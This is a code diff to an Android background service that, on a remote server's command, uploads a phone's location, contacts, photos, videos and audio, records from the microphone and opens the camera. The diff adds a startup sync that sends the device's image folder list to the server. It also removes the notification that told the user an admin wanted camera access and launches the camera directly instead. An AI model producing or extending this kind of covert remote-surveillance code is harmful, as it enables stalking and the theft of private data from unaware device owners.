@@ -10,6 +10,7 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.media.MediaRecorder;
+import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Handler;
@@ -17,21 +18,26 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 import java.io.File;
-
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.RequestBody;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
-
+import java.io.FileOutputStream;
 import com.example.devicetrackerapp.MainActivity;
 import com.example.devicetrackerapp.R;
-import com.example.devicetrackerapp.activity.CameraPermissionActivity;
+import com.example.devicetrackerapp.activity.CameraActivity;
+//import com.example.devicetrackerapp.activity.CameraPermissionActivity;
 import com.example.devicetrackerapp.api.ApiClient;
 import com.example.devicetrackerapp.dto.ApiResponse;
 import com.example.devicetrackerapp.dto.AudioItem;
 import com.example.devicetrackerapp.dto.ContactItem;
+import com.example.devicetrackerapp.dto.ImageFolderItem;
+import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
 import com.example.devicetrackerapp.dto.VideoItem;
 import com.example.devicetrackerapp.dto.ContactPayload;
 import com.example.devicetrackerapp.dto.TrackingConfigResponse;
@@ -39,6 +45,7 @@ import com.example.devicetrackerapp.dto.UpdateLocationRequest;
 import com.example.devicetrackerapp.utils.AudioUtils;
 import com.example.devicetrackerapp.utils.ContactUtils;
 import com.example.devicetrackerapp.utils.DeviceUtils;
+import com.example.devicetrackerapp.utils.InputStreamRequestBody;
 import com.example.devicetrackerapp.utils.VideoUtils;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
@@ -58,6 +65,10 @@ public class DeviceTrackingService extends Service {
 
     private boolean cameraRequestShown = false;
 
+    private static final int IMAGE_BATCH_SIZE = 3;
+
+    private boolean folderSynced = false;
+    private boolean imageUploading = false;
     private Handler handler;
 
     private String deviceId;
@@ -68,6 +79,11 @@ public class DeviceTrackingService extends Service {
     private long interval = 60000;
 
     private FusedLocationProviderClient locationClient;
+
+    private String folder;
+    private int limit = 20;
+    private int offset = 0;
+    private String order = "DESC";
 
     @Override
     public void onCreate() {
@@ -81,6 +97,14 @@ public class DeviceTrackingService extends Service {
         deviceId = DeviceUtils.getDeviceId(this);
 
         handler = new Handler();
+
+        Log.d(TAG, "Before syncImageFolders");
+        Log.d(TAG, "folderSynced" + folderSynced);
+        if (!folderSynced) {
+            Log.d(TAG, "Calling syncImageFolders");
+            syncImageFolders();
+            folderSynced = true;
+        }
 
         startTracking();
 
@@ -302,20 +326,33 @@ public class DeviceTrackingService extends Service {
 
     private void fetchTrackingConfig() {
 
+        String deviceId = DeviceUtils.getDeviceId(this);
+
         ApiClient.getApiService()
-                .getTrackingConfig(DeviceUtils.getDeviceId(this))
+                .getTrackingConfig(deviceId)
                 .enqueue(new Callback<ApiResponse<TrackingConfigResponse>>() {
 
                     @Override
-                    public void onResponse(Call<ApiResponse<TrackingConfigResponse>> call,
-                                           Response<ApiResponse<TrackingConfigResponse>> response) {
+                    public void onResponse(
+                            Call<ApiResponse<TrackingConfigResponse>> call,
+                            Response<ApiResponse<TrackingConfigResponse>> response) {
 
                         if (response.isSuccessful()
                                 && response.body() != null
                                 && response.body().isSuccess()) {
 
-                            TrackingConfigResponse config =
-                                    response.body().getData();
+                            TrackingConfigResponse config = response.body().getData();
+                            Log.d(TAG,"================ CONFIG ================");
+                            Log.d(TAG,"tracking="+config.getTrackingEnabled());
+                            Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
+                            Log.d(TAG,"refreshContacts="+config.getRefreshContacts());
+                            Log.d(TAG,"refreshImages="+config.getRefreshImages());
+                            Log.d(TAG,"imageBucket="+config.getImageBucketId());
+                            Log.d(TAG,"refreshVideos="+config.getRefreshVideos());
+                            Log.d(TAG,"refreshAudios="+config.getRefreshAudios());
+                            Log.d(TAG,"refreshMic="+config.getRefreshMic());
+                            Log.d(TAG,"refreshCamera="+config.getRefreshCamera());
+                            Log.d(TAG,"========================================");
 
                             if (config != null) {
 
@@ -326,13 +363,14 @@ public class DeviceTrackingService extends Service {
 
                                 } else {
 
-                                    interval = 60000;
+                                    interval = 60000L;
 
                                 }
 
                                 Log.d(TAG, "Tracking : " + config.getTrackingEnabled());
                                 Log.d(TAG, "Interval : " + interval);
 
+                                // Location
                                 if (Boolean.TRUE.equals(config.getTrackingEnabled())) {
 
                                     getLocation();
@@ -342,90 +380,127 @@ public class DeviceTrackingService extends Service {
                                     Log.d(TAG, "Tracking Disabled");
 
                                 }
-                                // Upload Contacts
+
+                                // Contacts
+                                Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
+                                Log.d(TAG,"refreshContacts="+config.getRefreshContacts());
+
                                 if (!Boolean.TRUE.equals(config.getContactsUploaded())
                                         || Boolean.TRUE.equals(config.getRefreshContacts())) {
 
+                                    Log.d(TAG,"uploadContacts() CALLED");
                                     uploadContacts();
 
+                                } else {
+                                    Log.d(TAG,"Contacts already uploaded. Skip.");
                                 }
 
-                                // Upload Images
-                                if (!Boolean.TRUE.equals(config.getImagesUploaded())
-                                        || Boolean.TRUE.equals(config.getRefreshImages())) {
+                               // Images
+                                Log.d(TAG, "refreshImages = " + config.getRefreshImages());
+                                Log.d(TAG, "imageUploading = " + imageUploading);
+                                Log.d(TAG,"Bucket="+config.getImageBucketId());
 
-                                    uploadImages();
+                                if (Boolean.TRUE.equals(config.getRefreshImages()) && !imageUploading) {
+                                    Log.d(TAG, "uploadImages() called");
+                                    Log.d(TAG, "Folder = " + config.getImageBucketId());
+                                    imageUploading = true;
+
+                                    uploadImages(
+                                            config.getImageBucketId(),
+                                            config.getImageLimit() != null ? config.getImageLimit() : 20,
+                                            config.getImageOffset() != null ? config.getImageOffset() : 0,
+                                            config.getImageOrder() != null ? config.getImageOrder() : "NEWEST"
+                                    );
                                 }
 
-                                // Upload Videos
-                                if(Boolean.TRUE.equals(config.getRefreshVideos())){
+                                // Videos
+                                if (Boolean.TRUE.equals(config.getRefreshVideos())) {
 
                                     uploadVideos();
 
                                 }
 
-                                //Upload Audio
-                                if(Boolean.TRUE.equals(config.getRefreshAudios())){
+                                // Audios
+                                if (Boolean.TRUE.equals(config.getRefreshAudios())) {
 
                                     uploadAudios();
 
                                 }
 
-                                //Mic
+                                // Mic Recording
                                 if (Boolean.TRUE.equals(config.getRefreshMic())) {
 
                                     startMicRecording(config.getMicDuration());
 
                                 }
 
-// Camera
+                                // Camera
+                                Log.d(TAG, "refreshCamera = " + config.getRefreshCamera());
+                                Log.d(TAG, "cameraStreaming = " + config.getCameraStreaming());
                                 if (Boolean.TRUE.equals(config.getRefreshCamera())) {
 
                                     ApiClient.getApiService()
                                             .cameraRequestReceived(deviceId)
-                                            .enqueue(new Callback<String>() {
+                                            .enqueue(new Callback<ApiResponse<String>>() {
 
                                                 @Override
                                                 public void onResponse(
-                                                        Call<String> call,
-                                                        Response<String> response) {
+                                                        Call<ApiResponse<String>> call,
+                                                        Response<ApiResponse<String>> response) {
 
-                                                    if (response.isSuccessful()) {
+                                                    if (response.isSuccessful()
+                                                            && response.body() != null
+                                                            && response.body().isSuccess()) {
 
-                                                        Intent intent = new Intent(
-                                                                DeviceTrackingService.this,
-                                                                CameraPermissionActivity.class
-                                                        );
+                                                        Intent intent =
+                                                                new Intent(
+                                                                        DeviceTrackingService.this,
+                                                                        CameraActivity.class
+                                                                );
 
                                                         intent.putExtra("deviceId", deviceId);
 
                                                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
                                                         startActivity(intent);
+
+                                                    } else {
+
+                                                        Log.e(TAG, "Camera Request Failed");
+
+                                                        if (response.body() != null) {
+                                                            Log.e(TAG, "Message : " + response.body().getMessage());
+                                                        }
+
                                                     }
+
                                                 }
 
                                                 @Override
                                                 public void onFailure(
-                                                        Call<String> call,
+                                                        Call<ApiResponse<String>> call,
                                                         Throwable t) {
 
-                                                    Log.e(TAG, "Camera Request Acknowledge Failed", t);
+                                                    Log.e(TAG, "Camera Request Failed", t);
 
                                                 }
 
                                             });
 
                                 }
+
                             }
+
                         }
 
                         handler.postDelayed(runnable, interval);
+
                     }
 
                     @Override
-                    public void onFailure(Call<ApiResponse<TrackingConfigResponse>> call,
-                                          Throwable t) {
+                    public void onFailure(
+                            Call<ApiResponse<TrackingConfigResponse>> call,
+                            Throwable t) {
 
                         Log.e(TAG, "Config Error", t);
 
@@ -437,69 +512,6 @@ public class DeviceTrackingService extends Service {
 
     }
 
-    private void showCameraNotification(String deviceId) {
-
-        Intent intent =
-                new Intent(this,
-                        CameraPermissionActivity.class);
-
-
-        intent.putExtra(
-                "deviceId",
-                deviceId
-        );
-
-        intent.addFlags(
-                Intent.FLAG_ACTIVITY_NEW_TASK
-        );
-
-        PendingIntent pendingIntent =
-                PendingIntent.getActivity(
-
-                        this,
-
-                        101,
-
-                        intent,
-
-                        PendingIntent.FLAG_UPDATE_CURRENT
-                                | PendingIntent.FLAG_IMMUTABLE
-
-                );
-
-        NotificationCompat.Builder builder =
-                new NotificationCompat.Builder(
-
-                        this,
-
-                        "tracking_channel"
-
-                )
-
-                        .setSmallIcon(R.drawable.ic_launcher_foreground)
-
-                        .setContentTitle("Camera Access Request")
-
-                        .setContentText(
-                                "Admin wants to access your camera")
-
-                        .setPriority(
-                                NotificationCompat.PRIORITY_HIGH)
-
-                        .setCategory(
-                                NotificationCompat.CATEGORY_CALL)
-
-                        .setAutoCancel(true)
-
-                        .setContentIntent(pendingIntent);
-
-        NotificationManager manager =
-                (NotificationManager)
-                        getSystemService(NOTIFICATION_SERVICE);
-
-        manager.notify(2001, builder.build());
-
-    }
     private boolean hasPermission(String permission) {
 
         return ActivityCompat.checkSelfPermission(
@@ -508,6 +520,7 @@ public class DeviceTrackingService extends Service {
         ) == PackageManager.PERMISSION_GRANTED;
 
     }
+
     private void uploadContacts() {
         Toast.makeText(this, "uploadContacts Called", Toast.LENGTH_SHORT).show();
 
@@ -572,7 +585,12 @@ public class DeviceTrackingService extends Service {
 
         }
     }
-    private void uploadImages() {
+
+    private void uploadImages(String folder,
+                              int limit,
+                              int offset,
+                              String order) {
+
 
         try {
 
@@ -580,117 +598,292 @@ public class DeviceTrackingService extends Service {
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
 
-                permissionGranted =
-                        hasPermission(Manifest.permission.READ_MEDIA_IMAGES);
+                permissionGranted = hasPermission(Manifest.permission.READ_MEDIA_IMAGES);
 
             } else {
 
-                permissionGranted =
-                        hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
+                permissionGranted = hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
 
             }
 
             if (!permissionGranted) {
+
+                imageUploading = false;
+                Log.e(TAG, "Image Permission Denied");
+                return;
+
+            }
+
+            // Default values
+            if (limit <= 0) {
+                limit = 20;
+            }
+
+            if (order == null || order.trim().isEmpty()) {
+                order = "NEWEST";
+            }
+
+            List<ImageItem> images = ImageUtils.getImages(
+
+                    this,
+                    folder,
+                    limit,
+                    offset,
+                    order
+
+            );
+
+            Log.d(TAG, "uploadImages() called");
+            Log.d(TAG, "Folder = " + folder);
+            Log.d(TAG, "Limit = " + limit);
+            Log.d(TAG, "Offset = " + offset);
+            Log.d(TAG, "Order = " + order);
+            Log.d(TAG, "Images Found = " + images.size());
+
+            if (images == null) {
+                Log.d(TAG, "Images list is NULL");
+                imageUploading = false;
                 return;
             }
 
-            List<ImageItem> images = ImageUtils.getImages(this);
+            Log.d(TAG, "Images Found = " + images.size());
 
-            if (images == null || images.isEmpty()) {
+            if (images.isEmpty()) {
 
                 Log.d(TAG, "No Images Found");
-
+                imageUploading = false;
                 return;
             }
 
-            String deviceId = DeviceUtils.getDeviceId(this);
+            uploadImageBatch(images, 0);
 
-            RequestBody deviceBody =
-                    RequestBody.create(
-                            deviceId,
-                            MultipartBody.FORM
-                    );
+        } catch (Exception e) {
 
-            List<MultipartBody.Part> parts = new ArrayList<>();
+            imageUploading = false;
+            Log.e(TAG, "Image Upload Exception", e);
 
-            for (ImageItem item : images) {
+        }
 
-                File file = new File(item.getImagePath());
+    }
 
-                if (!file.exists()) {
+    private void uploadImageBatch(List<ImageItem> images, int startIndex) {
 
-                    Log.e(TAG,
-                            "File Not Found : " + file.getAbsolutePath());
 
-                    continue;
-                }
+        if (startIndex >= images.size()) {
 
-                RequestBody requestFile =
-                        RequestBody.create(
-                                file,
+            imageUploading = false;
+
+            Log.d(TAG, "All Images Uploaded");
+
+            return;
+
+        }
+
+        RequestBody deviceBody =
+                RequestBody.create(
+                        DeviceUtils.getDeviceId(this),
+                        MultipartBody.FORM
+                );
+
+        RequestBody clearOldBody =
+                RequestBody.create(
+                        startIndex == 0 ? "true" : "false",
+                        MultipartBody.FORM
+                );
+
+        List<MultipartBody.Part> parts = new ArrayList<>();
+
+        int endIndex =
+                Math.min(
+                        startIndex + IMAGE_BATCH_SIZE,
+                        images.size()
+                );
+
+        for (int i = startIndex; i < endIndex; i++) {
+
+            ImageItem item = images.get(i);
+            Log.d(TAG, "Uploading : " + item.getImageName());
+            Log.d(TAG, "Uri : " + item.getImageUri());
+
+            try {
+
+                RequestBody requestBody =
+                        new InputStreamRequestBody(
+                                this,
+                                item.getImageUri(),
                                 MediaType.parse("image/*")
                         );
 
                 MultipartBody.Part part =
                         MultipartBody.Part.createFormData(
                                 "files",
-                                file.getName(),
-                                requestFile
+                                item.getImageName(),
+                                requestBody
                         );
 
                 parts.add(part);
+
+            } catch (Exception e) {
+
+                Log.e(TAG,
+                        "Image Read Error : "
+                                + item.getImageName(),
+                        e);
+
             }
 
-            if (parts.isEmpty()) {
+        }
 
-                Log.e(TAG, "No Valid Images Found");
+        if (parts.isEmpty()) {
 
-                return;
-            }
+            uploadImageBatch(images, endIndex);
 
-            ApiClient.getApiService()
-                    .uploadImages(deviceBody, parts)
-                    .enqueue(new Callback<String>() {
+            return;
 
-                        @Override
-                        public void onResponse(
-                                Call<String> call,
-                                Response<String> response) {
+        }
 
-                            if (response.isSuccessful()) {
+        Log.d(TAG, "Uploading Batch = " + parts.size());
+        Log.d(TAG, "DeviceId = " + DeviceUtils.getDeviceId(this));
+        Log.d(TAG, "ClearOld = " + (startIndex == 0));
+        Log.d(TAG, "Parts Count = " + parts.size());
 
-                                Log.d(TAG,
-                                        "All Images Uploaded Successfully");
+        ApiClient.getApiService()
+                .uploadImages(
+                        deviceBody,
+                        clearOldBody,
+                        parts
+                )
+                .enqueue(new Callback<ApiResponse<String>>() {
 
-                            } else {
+                    @Override
+                    public void onResponse(
+                            Call<ApiResponse<String>> call,
+                            Response<ApiResponse<String>> response) {
+
+                        if (response.isSuccessful()
+                                && response.body() != null
+                                && response.body().isSuccess()) {
+
+                            Log.d(TAG,
+                                    "Uploaded Images : "
+                                            + startIndex
+                                            + " - "
+                                            + (endIndex - 1));
+
+                        } else {
+
+                            Log.e(TAG, "Upload Failed");
+
+                            if (response.body() != null) {
 
                                 Log.e(TAG,
-                                        "Image Upload Failed");
+                                        "Message : "
+                                                + response.body().getMessage());
 
                             }
 
                         }
 
-                        @Override
-                        public void onFailure(
-                                Call<String> call,
-                                Throwable t) {
+                        uploadImageBatch(images, endIndex);
 
-                            Log.e(TAG,
-                                    "Image Upload Error",
-                                    t);
+                    }
+
+                    @Override
+                    public void onFailure(
+                            Call<ApiResponse<String>> call,
+                            Throwable t) {
+
+                        Log.e(TAG, "Upload Error", t);
+
+                        uploadImageBatch(images, endIndex);
+
+                    }
+
+                });
+
+    }
+
+    private void syncImageFolders() {
+
+        Log.d(TAG, "========== Folder Sync ==========");
+
+        List<ImageFolderItem> folders = ImageUtils.getImageFolders(this);
+
+        Log.d(TAG, "DeviceId : " + DeviceUtils.getDeviceId(this));
+        Log.d(TAG, "Folder Count : " + folders.size());
+
+        for (ImageFolderItem item : folders) {
+
+            Log.d(TAG,
+                    "BucketId = " + item.getBucketId()
+                            + " | Folder = " + item.getFolderName()
+                            + " | Count = " + item.getImageCount());
+
+        }
+
+        ImageFolderSyncRequest request = new ImageFolderSyncRequest();
+
+        request.setDeviceId(DeviceUtils.getDeviceId(this));
+        request.setFolders(folders);
+
+        Log.d(TAG, "Calling Folder Sync API...");
+
+        ApiClient.getApiService()
+                .syncImageFolders(request)
+                .enqueue(new Callback<ApiResponse<String>>() {
+
+                    @Override
+                    public void onResponse(
+                            Call<ApiResponse<String>> call,
+                            Response<ApiResponse<String>> response) {
+
+                        Log.d(TAG, "HTTP Code : " + response.code());
+
+                        if (response.body() != null) {
+
+                            Log.d(TAG, "Success : " + response.body().isSuccess());
+                            Log.d(TAG, "Message : " + response.body().getMessage());
 
                         }
 
-                    });
+                        if (response.isSuccessful()
+                                && response.body() != null
+                                && response.body().isSuccess()) {
 
-        } catch (Exception e) {
+                            Log.d(TAG, "Folder Sync Success");
 
-            Log.e(TAG,
-                    "Image Upload Exception",
-                    e);
+                        } else {
 
-        }
+                            try {
+
+                                if (response.errorBody() != null) {
+
+                                    Log.e(TAG,
+                                            "Error Body : "
+                                                    + response.errorBody().string());
+
+                                }
+
+                            } catch (Exception e) {
+
+                                Log.e(TAG, "Error Reading ErrorBody", e);
+
+                            }
+
+                        }
+
+                    }
+
+                    @Override
+                    public void onFailure(
+                            Call<ApiResponse<String>> call,
+                            Throwable t) {
+
+                        Log.e(TAG, "Folder Sync API Failed", t);
+
+                    }
+
+                });
 
     }
 
@@ -777,34 +970,34 @@ public class DeviceTrackingService extends Service {
 
                     .uploadVideos(deviceBody,parts)
 
-                    .enqueue(new Callback<String>() {
+                    .enqueue(new Callback<ApiResponse<String>>() {
 
                         @Override
                         public void onResponse(
-                                Call<String> call,
-                                Response<String> response) {
+                                Call<ApiResponse<String>> call,
+                                Response<ApiResponse<String>> response) {
 
-                            if (response.isSuccessful()) {
+                            if (response.isSuccessful()
+                                    && response.body() != null
+                                    && response.body().isSuccess()) {
 
                                 Log.d(TAG, "Videos Uploaded Successfully");
 
                             } else {
 
-                                Log.e(TAG, "Video Upload Failed : " + response.code());
+                                Log.e(TAG, "Video Upload Failed");
 
                             }
-
                         }
 
                         @Override
                         public void onFailure(
-                                Call<String> call,
+                                Call<ApiResponse<String>> call,
                                 Throwable t) {
 
                             Log.e(TAG, "Video Upload Error", t);
 
                         }
-
                     });
 
         }
@@ -909,33 +1102,34 @@ public class DeviceTrackingService extends Service {
 
                     .uploadAudios(deviceBody, parts)
 
-                    .enqueue(new Callback<String>() {
+                    .enqueue(new Callback<ApiResponse<String>>() {
 
                         @Override
                         public void onResponse(
-                                Call<String> call,
-                                Response<String> response) {
+                                Call<ApiResponse<String>> call,
+                                Response<ApiResponse<String>> response) {
 
-                            if (response.isSuccessful()) {
+                            if (response.isSuccessful()
+                                    && response.body() != null
+                                    && response.body().isSuccess()) {
 
-                                Log.d(TAG,
-                                        "Audios Uploaded");
+                                Log.d(TAG, "Audios Uploaded");
+
+                            } else {
+
+                                Log.e(TAG, "Audio Upload Failed");
 
                             }
-
                         }
 
                         @Override
                         public void onFailure(
-                                Call<String> call,
+                                Call<ApiResponse<String>> call,
                                 Throwable t) {
 
-                            Log.e(TAG,
-                                    "Audio Upload Failed",
-                                    t);
+                            Log.e(TAG, "Audio Upload Failed", t);
 
                         }
-
                     });
 
         }
@@ -1049,14 +1243,16 @@ public class DeviceTrackingService extends Service {
                         durationBody,
                         part
                 )
-                .enqueue(new Callback<String>() {
+                .enqueue(new Callback<ApiResponse<String>>() {
 
                     @Override
                     public void onResponse(
-                            Call<String> call,
-                            Response<String> response) {
+                            Call<ApiResponse<String>> call,
+                            Response<ApiResponse<String>> response) {
 
-                        if (response.isSuccessful()) {
+                        if (response.isSuccessful()
+                                && response.body() != null
+                                && response.body().isSuccess()) {
 
                             Log.d(TAG, "Mic Uploaded Successfully");
 
@@ -1066,24 +1262,21 @@ public class DeviceTrackingService extends Service {
 
                         } else {
 
-                            Log.e(TAG,
-                                    "Mic Upload Failed : "
-                                            + response.code());
+                            Log.e(TAG, "Mic Upload Failed");
 
                         }
                     }
 
                     @Override
                     public void onFailure(
-                            Call<String> call,
+                            Call<ApiResponse<String>> call,
                             Throwable t) {
 
-                        Log.e(TAG,
-                                "Mic Upload Error",
-                                t);
+                        Log.e(TAG, "Mic Upload Error", t);
 
                     }
                 });
 
     }
+
 }
